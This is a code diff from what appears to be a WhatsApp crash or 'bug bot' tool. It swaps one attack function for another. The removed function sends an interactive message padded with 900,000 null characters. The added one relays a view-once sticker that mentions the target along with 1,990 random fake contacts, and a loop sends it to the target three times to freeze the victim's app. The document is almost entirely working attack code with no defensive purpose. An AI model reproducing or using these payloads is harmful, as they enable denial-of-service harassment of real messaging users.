@@ -4725,7 +4725,7 @@ Description : Android Delay Invisible
             
             for (let i = 0; i < 3; i++) {
                 try {
-                    await PriasoloDelayInvis(sock, target);
+                    await PriasoloFrezee(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -5617,30 +5617,36 @@ async function VogueBuldo(sock, target) {
 }
 }
 
-async function PriasoloDelayInvis(sock, target) {
-  var msg = generateWAMessageFromContent(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "Pria Solo",
-            format: "EXTENSION"
+async function PriasoloFrezee(sock, target) {
+  await sock.relayMessage(target, {
+      viewOnceMessage: {
+        message: {
+          stickerMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?...",
+            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+            mimetype: "image/webp",
+            directPath: "/v/t62.7161-24/10000000_1197738342006156_...",
+            fileLength: { low: 1, high: 0, unsigned: true },
+            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+            isAnimated: true,
+            contextInfo: {
+              mentionedJid: [
+                target,
+                ...Array.from({ length: 1990 }, () =>
+                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
+                ),
+              ],
+            },
           },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: {\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}},
-            version: 3
-          }
-        }
-      }
-    }
-  }, { userJid: target });
-
-  await sock.relayMessage(target, msg.message, {
-    participant: { jid: target },
-    messageId: msg.key.id
-  });
-}
+        },
+      },
+      messageId: null,
+      participant: { jid: target },
+    }
+  );
+} 
 
 
 //     _       ___  _   _ _   _ _____  _   _        
